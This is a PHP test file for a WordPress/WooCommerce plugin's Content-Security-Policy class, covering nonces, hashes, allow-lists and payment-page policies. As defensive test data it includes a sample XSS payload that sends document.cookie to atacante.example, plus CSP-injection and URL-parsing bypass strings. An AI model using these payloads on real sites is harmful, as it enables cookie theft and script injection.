<?php
/**
 * T033: CSP por tipo de página.
 *
 * @package Aralia
 */

namespace Aralia\Tests\Integration;

use Aralia\Security\Csp;
use Aralia\Tests\Support\IsolatedTestCase;

final class CspTest extends IsolatedTestCase {

	private const NONCE = 'abcdefghijklmnopqrstuvwx';

	protected function set_up() {
		parent::set_up();
		Csp::reset();
	}

	protected function tear_down() {
		delete_option( Csp::OPTION_MODE );
		delete_option( Csp::OPTION_REPORT );
		Csp::reset();
		remove_all_filters( 'aralia_csp_nonce_handles' );
		parent::tear_down();
	}

	private function directive( string $policy, string $name ): string {
		foreach ( explode( '; ', $policy ) as $d ) {
			if ( 0 === strpos( $d, $name . ' ' ) ) {
				return $d;
			}
		}
		$this->fail( "No hay directiva $name en: $policy" );
	}

	/**
	 * @dataProvider provide_payment_types
	 */
	public function test_payment_policies_use_nonce_and_strict_dynamic_without_unsafe_script_sources( string $type ): void {
		$policy = Csp::policy( $type, self::NONCE );
		$script = $this->directive( $policy, 'script-src' );
		$this->assertStringContainsString( "'nonce-" . self::NONCE . "'", $script );
		// strict-dynamic solo donde un tercero carga más scripts; en la página de Gracias (sin terceros) los scripts con nonce no confían en lo que inserten.
		$this->assertSame( 'thankyou' !== $type, false !== strpos( $script, "'strict-dynamic'" ), "strict-dynamic en $type" );
		$this->assertStringNotContainsString( "'unsafe-inline'", $script );
		$this->assertStringNotContainsString( "'unsafe-eval'", $script );
		$this->assertStringContainsString( "frame-ancestors 'self'", $policy );
		$this->assertStringContainsString( "object-src 'none'", $policy );
		$this->assertStringContainsString( "base-uri 'self'", $policy );
	}

	/**
	 * @return array<string,array{string}>
	 */
	public static function provide_payment_types(): array {
		return array(
			'checkout'  => array( 'checkout' ),
			'order-pay' => array( 'order-pay' ),
			'thankyou'  => array( 'thankyou' ),
		);
	}

	public function test_each_payment_page_only_allows_its_own_third_parties(): void {
		$checkout = Csp::policy( 'checkout', self::NONCE );
		$this->assertStringContainsString( 'https://challenges.cloudflare.com', $checkout );
		$this->assertStringNotContainsString( 'wompi', $checkout, 'El checkout solo lleva Turnstile (R-11)' );

		$pay = Csp::policy( 'order-pay', self::NONCE );
		$this->assertStringContainsString( 'https://checkout.wompi.co', $this->directive( $pay, 'script-src' ) );
		$this->assertStringContainsString( 'https://checkout.wompi.co', $this->directive( $pay, 'frame-src' ) );
		$this->assertStringNotContainsString( 'cloudflare', $pay, 'order-pay solo lleva Wompi' );

		$thanks = Csp::policy( 'thankyou', self::NONCE );
		$this->assertStringNotContainsString( 'wompi', $thanks );
		$this->assertStringNotContainsString( 'cloudflare', $thanks );
		$this->assertSame( "frame-src 'none'", $this->directive( $thanks, 'frame-src' ) );
	}

	public function test_policy_rejects_a_missing_or_weak_nonce_and_unknown_types(): void {
		foreach ( array( '', 'corto', "evil'; script-src *", str_repeat( 'a', 15 ) ) as $bad ) {
			try {
				Csp::policy( 'checkout', $bad );
				$this->fail( "Debía rechazar el nonce '$bad'" );
			} catch ( \InvalidArgumentException $e ) {
				$this->assertSame( 'Nonce inválido.', $e->getMessage() );
			}
		}
		$this->expectException( \InvalidArgumentException::class );
		Csp::policy( 'inventado', self::NONCE );
	}

	public function test_public_policy_uses_paths_not_whole_hosts_so_a_foreign_gtm_container_cannot_load(): void {
		$script = $this->directive( Csp::policy( 'public' ), 'script-src' );
		$this->assertStringContainsString( 'https://www.googletagmanager.com/gtag/js', $script );
		$this->assertStringNotContainsString( 'googletagmanager.com ', $script . ' ', 'No se permite el host completo (gtm.js?id=OTRO)' );
		$this->assertStringContainsString( 'https://connect.facebook.net/en_US/fbevents.js', $script );
		$this->assertStringNotContainsString( 'wompi', $script, 'Las páginas públicas no cargan scripts de Wompi' );
		$this->assertStringContainsString( 'https://challenges.cloudflare.com', $script, 'Los formularios públicos (avisos de stock) usan Turnstile' );
		$this->assertStringContainsString( 'https://challenges.cloudflare.com', $this->directive( Csp::policy( 'public' ), 'frame-src' ) );
	}

	public function test_public_hashes_are_filtered_capped_and_never_unsafe(): void {
		$good   = Csp::hash_of( 'console.log(1)' );
		$policy = Csp::policy( 'public', '', array( $good, "'unsafe-inline'", 'sha256-sin-comillas', "'sha256-corto'", $good ) );
		$script = $this->directive( $policy, 'script-src' );
		$this->assertSame( 1, substr_count( $script, $good ), 'Sin duplicados' );
		$this->assertStringNotContainsString( "'unsafe-inline'", $script );
		$this->assertStringNotContainsString( 'sha256-corto', $script );

		$many   = array_map( static fn( $i ) => Csp::hash_of( "x$i" ), range( 1, 200 ) );
		$capped = $this->directive( Csp::policy( 'public', '', $many ), 'script-src' );
		$this->assertSame( Csp::MAX_HASHES, substr_count( $capped, "'sha256-" ), 'Un tope evita cabeceras gigantes (500/502)' );
		$this->assertLessThan( 6000, strlen( Csp::policy( 'public', '', $many ) ) );
	}

	public function test_hosts_can_be_extended_by_filter_after_the_inventory(): void {
		$cb = static fn( $hosts ) => array_merge( $hosts, array( 'https://nuevo.example.com/lib.js' ) );
		add_filter( 'aralia_csp_script_hosts', $cb );
		$this->assertStringContainsString( 'https://nuevo.example.com/lib.js', $this->directive( Csp::policy( 'public' ), 'script-src' ) );
		remove_filter( 'aralia_csp_script_hosts', $cb );
	}

	public function test_only_scripts_printed_by_the_wordpress_api_get_a_hash_not_html_injected_in_the_body(): void {
		// start() abre la recogida de hashes en una página pública (como lo haría template_redirect).
		Csp::use_io( static function () {}, static fn() => false );
		Csp::start();

		// Un script legítimo, impreso por la API de WordPress: se registra su hash.
		$legit = wp_get_inline_script_tag( 'window.araliaOk = 1;' );
		$this->assertStringContainsString( 'araliaOk', $legit );
		// Un script inyectado en el cuerpo (XSS): nunca pasa por la API, así que no recibe hash.
		$injected = '<script>fetch("https://atacante.example/?c="+document.cookie)</script>';
		$page     = '<html><body>' . $legit . $injected . '</body></html>';

		$collected = Csp::collected_hashes();
		$this->assertContains( Csp::hash_of( "\nwindow.araliaOk = 1;\n" ), $collected, 'El hash coincide con el texto EXACTO que WordPress imprime' );
		foreach ( Csp::inline_script_hashes( $page ) as $in_page ) {
			if ( false !== strpos( $injected, 'atacante' ) && $in_page === Csp::hash_of( 'fetch("https://atacante.example/?c="+document.cookie)' ) ) {
				$this->assertNotContains( $in_page, $collected, 'El script inyectado NO debe estar en la política' );
			}
		}
		$this->assertNotContains( Csp::hash_of( 'fetch("https://atacante.example/?c="+document.cookie)' ), $collected );
		$policy = Csp::policy( 'public', '', $collected );
		$this->assertStringNotContainsString( base64_encode( hash( 'sha256', 'fetch("https://atacante.example/?c="+document.cookie)', true ) ), $policy );
		ob_end_clean();
	}

	public function test_json_data_blocks_are_not_hashed(): void {
		Csp::use_io( static function () {}, static fn() => false );
		Csp::start();
		wp_get_inline_script_tag( '{"@context":"x"}', array( 'type' => 'application/ld+json' ) );
		$this->assertSame( array(), Csp::collected_hashes() );
		ob_end_clean();
	}

	public function test_inline_script_hashes_cover_only_executable_inline_scripts_for_the_monitor(): void {
		$html   = '<script>var a=1;</script><script type="text/javascript">var b=2;</script><script type="module">import x from "/y.js";</script>'
			. '<script src="/externo.js"></script><script type="application/ld+json">{"@context":"x"}</script>'
			. '<script type="text/template"><div></div></script><script>   </script><script>var a=1;</script>';
		$this->assertSame(
			array( Csp::hash_of( 'var a=1;' ), Csp::hash_of( 'var b=2;' ), Csp::hash_of( 'import x from "/y.js";' ) ),
			Csp::inline_script_hashes( $html )
		);
	}

	/**
	 * @dataProvider provide_handles
	 */
	public function test_only_allow_listed_handles_get_the_nonce_on_payment_pages( string $id, bool $expected ): void {
		$this->assertSame( $expected, Csp::handle_may_have_nonce( $id ), $id );
		$this->start_payment_page( 'checkout' );
		$attrs = Csp::add_nonce_attribute( array( 'id' => $id, 'src' => '/wp-includes/js/x.js' ) );
		$this->assertSame( $expected, isset( $attrs['nonce'] ), "nonce para $id" );
	}

	/**
	 * @return array<string,array{string,bool}>
	 */
	public static function provide_handles(): array {
		return array(
			'aralia'              => array( 'aralia-checkout-js', true ),
			'woocommerce'         => array( 'wc-blocks-checkout-js', true ),
			'wp core'             => array( 'wp-i18n-js', true ),
			'inline after'        => array( 'aralia-widget-js-after', true ),
			'wompi'               => array( 'wompi-widget-js', true ),
			'plugin ajeno'        => array( 'plugin-raro-tracker-js', false ),
			'wordfence'           => array( 'wordfence-js', false ),
			'sin id'              => array( '', false ),
			'prefijo disfrazado'  => array( 'evil-wc-js', false ),
		);
	}

	/**
	 * Arranca la CSP como lo haría template_redirect en esa página y devuelve las cabeceras enviadas.
	 *
	 * @return string[]
	 */
	private function start_payment_page( string $page, string $mode = 'enforce' ): array {
		global $wp;
		$wp->query_vars = array();
		remove_all_filters( 'woocommerce_is_checkout' );
		if ( 'order-pay' === $page || 'order-received' === $page ) {
			$wp->query_vars[ $page ] = '1';
		} elseif ( 'checkout' === $page ) {
			add_filter( 'woocommerce_is_checkout', '__return_true' );
		}
		update_option( Csp::OPTION_MODE, $mode );
		$sent = array();
		Csp::use_io( static function ( string $line ) use ( &$sent ) {
			$sent[] = $line;
		}, static fn() => false );
		Csp::start();
		return $sent;
	}

	/**
	 * @dataProvider provide_pages_and_policies
	 */
	public function test_start_sends_the_right_policy_for_each_page_with_a_fresh_nonce( string $page, string $expects_wompi_or_ts, bool $strict_dynamic ): void {
		$sent = $this->start_payment_page( $page );
		$this->assertCount( 1, $sent );
		$this->assertStringStartsWith( 'Content-Security-Policy: ', $sent[0], 'enforce => cabecera que se aplica' );
		$this->assertMatchesRegularExpression( "/'nonce-[A-Za-z0-9_-]{20,}'/", $sent[0], 'Lleva un nonce de la petición' );
		$this->assertSame( $strict_dynamic, false !== strpos( $sent[0], "'strict-dynamic'" ), "strict-dynamic en $page" );
		if ( 'none' === $expects_wompi_or_ts ) {
			$this->assertStringNotContainsString( 'wompi', $sent[0] );
			$this->assertStringNotContainsString( 'cloudflare', $sent[0] );
		} else {
			$this->assertStringContainsString( $expects_wompi_or_ts, $sent[0] );
		}
		// El nonce cambia en cada petición.
		preg_match( "/'nonce-([^']+)'/", $sent[0], $first );
		Csp::reset();
		$again = $this->start_payment_page( $page );
		preg_match( "/'nonce-([^']+)'/", $again[0], $second );
		$this->assertNotSame( $first[1], $second[1] );
	}

	/**
	 * @return array<string,array{string,string,bool}>
	 */
	public static function provide_pages_and_policies(): array {
		return array(
			'checkout'  => array( 'checkout', 'challenges.cloudflare.com', true ),
			'order-pay' => array( 'order-pay', 'checkout.wompi.co', true ),
			'gracias'   => array( 'order-received', 'none', false ),
		);
	}

	public function test_report_only_mode_sends_the_report_only_header_and_off_sends_nothing(): void {
		$sent = $this->start_payment_page( 'checkout', 'report-only' );
		$this->assertStringStartsWith( 'Content-Security-Policy-Report-Only: ', $sent[0] );
		Csp::reset();
		$this->assertSame( array(), $this->start_payment_page( 'checkout', 'off' ), 'Con la CSP apagada no se envía nada' );
	}

	public function test_nothing_is_sent_if_headers_already_went_out(): void {
		global $wp;
		$wp->query_vars = array();
		add_filter( 'woocommerce_is_checkout', '__return_true' );
		update_option( Csp::OPTION_MODE, 'enforce' );
		$sent = array();
		Csp::use_io( static function ( string $l ) use ( &$sent ) {
			$sent[] = $l;
		}, static fn() => true );
		Csp::start();
		$this->assertSame( array(), $sent );
	}

	public function test_public_page_buffer_sends_the_policy_with_the_collected_hashes_when_flushed(): void {
		global $wp;
		$wp->query_vars = array();
		update_option( Csp::OPTION_MODE, 'enforce' );
		$sent = array();
		Csp::use_io( static function ( string $l ) use ( &$sent ) {
			$sent[] = $l;
		}, static fn() => false );
		$level = ob_get_level();
		Csp::start();
		$this->assertSame( $level + 1, ob_get_level(), 'Abre un buffer de salida' );
		wp_get_inline_script_tag( 'window.x = 1;' );
		echo '<html><script>evil()</script></html>';
		ob_get_clean(); // Vacía el buffer (ejecuta el callback) sin imprimir el cuerpo.
		$this->assertCount( 1, $sent );
		$this->assertStringStartsWith( 'Content-Security-Policy: ', $sent[0] );
		$this->assertStringContainsString( Csp::hash_of( "\nwindow.x = 1;\n" ), $sent[0] );
		$this->assertStringNotContainsString( base64_encode( hash( 'sha256', 'evil()', true ) ), $sent[0], 'El script escrito a mano en el cuerpo NO recibe hash' );
	}

	public function test_public_buffer_logs_instead_of_failing_silently_when_headers_were_already_sent(): void {
		global $wp;
		$wp->query_vars = array();
		update_option( Csp::OPTION_MODE, 'enforce' );
		$log  = tempnam( sys_get_temp_dir(), 'aralia-csp' );
		$prev = ini_set( 'error_log', $log ); // phpcs:ignore WordPress.PHP.IniSet
		$state = array( 'sent' => false );
		Csp::use_io( static function () {}, static function () use ( &$state ) {
			return $state['sent'];
		} );
		Csp::start();
		$state['sent'] = true; // Algo envía cabeceras antes de que se vacíe el buffer.
		ob_end_flush();
		ini_set( 'error_log', (string) $prev ); // phpcs:ignore WordPress.PHP.IniSet
		$logged = (string) file_get_contents( $log );
		unlink( $log );
		$this->assertStringContainsString( 'CSP pública no enviada', $logged );
	}

	public function test_page_type_detects_checkout_order_pay_thankyou_and_public(): void {
		global $wp;
		$cases = array(
			'checkout'       => 'checkout',
			'order-pay'      => 'order-pay',
			'order-received' => 'thankyou',
			'public'         => 'public',
		);
		foreach ( $cases as $page => $expected ) {
			$wp->query_vars = array();
			remove_all_filters( 'woocommerce_is_checkout' );
			if ( 'order-pay' === $page || 'order-received' === $page ) {
				$wp->query_vars[ $page ] = '1';
			} elseif ( 'checkout' === $page ) {
				add_filter( 'woocommerce_is_checkout', '__return_true' );
			}
			$this->assertSame( $expected, Csp::page_type(), $page );
		}
	}

	/**
	 * @dataProvider provide_srcs
	 */
	public function test_nonce_is_only_given_to_scripts_from_this_site_or_the_allowed_third_parties( string $src, bool $trusted ): void {
		$this->assertSame( $trusted, Csp::src_is_trusted( $src ), $src );
		if ( '' === $src ) {
			return; // Sin src es un script inline: recibe nonce por su handle (no hay origen que comprobar).
		}
		$this->start_payment_page( 'checkout' );
		$attrs = Csp::add_nonce_attribute( array( 'id' => 'wc-extension-js', 'src' => $src ) );
		$this->assertSame( $trusted, isset( $attrs['nonce'] ), "nonce para $src con un handle 'wc-…'" );
	}

	/**
	 * @return array<string,array{string,bool}>
	 */
	public static function provide_srcs(): array {
		$own = (string) wp_parse_url( home_url(), PHP_URL_HOST );
		return array(
			'propio'                  => array( 'http://' . $own . '/wp-content/plugins/x/a.js', true ),
			'ruta relativa'           => array( '/wp-includes/js/a.js', true ),
			'turnstile'               => array( 'https://challenges.cloudflare.com/turnstile/v0/api.js', true ),
			'wompi'                   => array( 'https://checkout.wompi.co/widget.js', true ),
			'cdn ajena'               => array( 'https://cdn.ajeno.example/lib.js', false ),
			'barra invertida'         => array( '/\\evil.example/x.js', false ),
			'tab tras la barra'       => array( "/\t/evil.example/x.js", false ),
			'salto de línea'          => array( "/\n/evil.example/x.js", false ),
			'espacio'                 => array( 'https://checkout.wompi.co /x.js', false ),
			'arroba y barra inv.'     => array( 'https://evil.example\\@checkout.wompi.co/x.js', false ),
			'userinfo'                => array( 'https://checkout.wompi.co@evil.example/x.js', false ),
			'wompi por http'          => array( 'http://checkout.wompi.co/widget.js', false ),
			'wompi puerto raro'       => array( 'https://checkout.wompi.co:8443/widget.js', false ),
			'wompi puerto 443'        => array( 'https://checkout.wompi.co:443/widget.js', true ),
			'mayúsculas en el host'   => array( 'https://CHECKOUT.WOMPI.CO/widget.js', true ),
			'host con punto final'    => array( 'https://checkout.wompi.co./widget.js', false ),
			'esquema ftp'             => array( 'ftp://checkout.wompi.co/x.js', false ),
			'vacío'                   => array( '', false ),
			'solo barra'              => array( '/', true ),
			'protocolo relativo'      => array( '//cdn.ajeno.example/lib.js', false ),
			'host que contiene wompi' => array( 'https://checkout.wompi.co.atacante.example/x.js', false ),
			'sin host'                => array( 'javascript:alert(1)', false ),
		);
	}

	public function test_module_scripts_of_wordpress_and_woocommerce_get_the_nonce(): void {
		$this->assertTrue( Csp::handle_may_have_nonce( '@wordpress/interactivity-js-module' ) );
		$this->assertTrue( Csp::handle_may_have_nonce( '@woocommerce/stores/cart-js-module' ) );
		$this->assertFalse( Csp::handle_may_have_nonce( '@otro/paquete-js-module' ) );
	}

	public function test_hash_cap_is_60_and_logs_when_exceeded(): void {
		$log  = tempnam( sys_get_temp_dir(), 'aralia-csp' );
		$prev = ini_set( 'error_log', $log ); // phpcs:ignore WordPress.PHP.IniSet
		$many = array_map( static fn( $i ) => Csp::hash_of( "y$i" ), range( 1, 100 ) );
		$pol  = Csp::policy( 'public', '', $many );
		ini_set( 'error_log', (string) $prev ); // phpcs:ignore WordPress.PHP.IniSet
		$logged = (string) file_get_contents( $log );
		unlink( $log );
		$this->assertSame( 60, Csp::MAX_HASHES );
		$this->assertSame( 60, substr_count( $pol, "'sha256-" ) );
		$this->assertStringContainsString( 'sobrantes', $logged, 'Que sobren hashes no puede pasar en silencio' );
	}

	public function test_allow_list_can_be_extended_by_filter(): void {
		add_filter( 'aralia_csp_nonce_handles', static fn( $p ) => array_merge( $p, array( '/^turnstile-extra$/' ) ) );
		$this->assertTrue( Csp::handle_may_have_nonce( 'turnstile-extra-js' ) );
	}

	public function test_nonce_is_never_added_without_a_request_nonce(): void {
		$this->assertSame( array( 'id' => 'aralia-x-js', 'src' => 'a.js' ), Csp::add_nonce_attribute( array( 'id' => 'aralia-x-js', 'src' => 'a.js' ) ) );
	}

	public function test_mode_defaults_to_report_only_and_ignores_garbage(): void {
		$this->assertSame( 'report-only', Csp::mode() );
		update_option( Csp::OPTION_MODE, 'enforce' );
		$this->assertSame( 'enforce', Csp::mode() );
		update_option( Csp::OPTION_MODE, 'cualquier-cosa' );
		$this->assertSame( 'report-only', Csp::mode(), 'Un valor desconocido no desactiva la CSP' );
		$this->assertSame( 'Content-Security-Policy-Report-Only', Csp::header_name( 'report-only' ) );
		$this->assertSame( 'Content-Security-Policy', Csp::header_name( 'enforce' ) );
	}

	/**
	 * @dataProvider provide_report_uris
	 */
	public function test_report_uri_only_accepts_a_plain_https_url( string $uri, bool $accepted ): void {
		update_option( Csp::OPTION_REPORT, $uri );
		$policy = Csp::policy( 'public' );
		$this->assertSame( $accepted, false !== strpos( $policy, 'report-uri' ), $uri );
		if ( $accepted ) {
			$this->assertStringContainsString( 'report-uri ' . $uri, $policy );
		}
	}

	/**
	 * @return array<string,array{string,bool}>
	 */
	public static function provide_report_uris(): array {
		return array(
			'https'         => array( 'https://reportes.example.com/r', true ),
			'con puerto'    => array( 'https://reportes.example.com:8443/csp', true ),
			'http'          => array( 'http://insegura.example.com/r', false ),
			'punto y coma'  => array( "https://a.example.com/r; script-src *", false ),
			'espacio'       => array( 'https://a.example.com/r script-src', false ),
			'vacía'         => array( '', false ),
		);
	}

	public function test_page_type_skips_the_admin_panel(): void {
		set_current_screen( 'dashboard' );
		$this->assertSame( 'skip', Csp::page_type(), 'El panel no recibe esta CSP' );
		set_current_screen( 'front' );
		$this->assertSame( 'public', Csp::page_type() );
	}

	public function test_payment_types_are_exactly_checkout_order_pay_and_thankyou(): void {
		foreach ( array( 'checkout', 'order-pay', 'thankyou' ) as $t ) {
			$this->assertTrue( Csp::is_payment_type( $t ) );
		}
		foreach ( array( 'public', 'skip', '', 'cart' ) as $t ) {
			$this->assertFalse( Csp::is_payment_type( $t ) );
		}
	}

	public function test_the_header_nonce_is_the_same_one_the_allow_listed_scripts_receive(): void {
		$sent = $this->start_payment_page( 'checkout' );
		preg_match( "/'nonce-([^']+)'/", $sent[0], $in_header );
		$attrs = Csp::add_nonce_attribute( array( 'id' => 'wc-blocks-checkout-js', 'src' => '/wp-content/plugins/woocommerce/a.js' ) );
		$this->assertSame( $in_header[1], $attrs['nonce'], 'El nonce de la cabecera y el de los scripts deben ser el mismo, o el checkout se rompe en enforce' );
		$inline = Csp::on_inline_script( array( 'id' => 'aralia-widget-js-after' ), "\nx();\n" );
		$this->assertSame( $in_header[1], $inline['nonce'] );
	}

	public function test_start_sends_nothing_and_opens_no_buffer_for_admin_ajax_rest_and_feeds(): void {
		$sent  = array();
		$level = ob_get_level();
		update_option( Csp::OPTION_MODE, 'enforce' );
		Csp::use_io( static function ( string $l ) use ( &$sent ) {
			$sent[] = $l;
		}, static fn() => false );
		set_current_screen( 'dashboard' ); // Panel de administración.
		Csp::start();
		$this->assertSame( array(), $sent, 'wp-admin no recibe la CSP' );
		$this->assertSame( $level, ob_get_level(), 'ni se abre buffer' );
		set_current_screen( 'front' );
	}

	public function test_a_public_page_with_the_csp_off_gets_no_header_and_no_buffer(): void {
		global $wp;
		$wp->query_vars = array();
		$sent           = array();
		$level          = ob_get_level();
		update_option( Csp::OPTION_MODE, 'off' );
		Csp::use_io( static function ( string $l ) use ( &$sent ) {
			$sent[] = $l;
		}, static fn() => false );
		Csp::start();
		$this->assertSame( array(), $sent );
		$this->assertSame( $level, ob_get_level() );
	}

	public function test_a_public_page_in_report_only_sends_the_report_only_header(): void {
		global $wp;
		$wp->query_vars = array();
		update_option( Csp::OPTION_MODE, 'report-only' );
		$sent = array();
		Csp::use_io( static function ( string $l ) use ( &$sent ) {
			$sent[] = $l;
		}, static fn() => false );
		Csp::start();
		ob_get_clean();
		$this->assertCount( 1, $sent );
		$this->assertStringStartsWith( 'Content-Security-Policy-Report-Only: ', $sent[0] );
	}

	public function test_theme_motion_handles_never_get_a_nonce_but_other_aralia_handles_do(): void {
		$patterns = \Aralia\Security\Csp::nonce_handle_patterns();
		$allowed  = static function ( string $handle ) use ( $patterns ): bool {
			foreach ( $patterns as $pattern ) {
				if ( 1 === preg_match( $pattern, $handle ) ) {
					return true;
				}
			}
			return false;
		};
		foreach ( array( 'aralia-gsap', 'aralia-scrolltrigger', 'aralia-motion' ) as $handle ) {
			$this->assertFalse( $allowed( $handle ), "$handle no recibe nonce: en checkout, order-pay y Gracias no puede autorizarse aunque se encolara por error" );
		}
		$this->assertTrue( $allowed( 'aralia-checkout' ), 'Otros handles propios sí (p. ej. los scripts del pago)' );
		$this->assertTrue( $allowed( 'aralia-order-status' ) );
	}
}
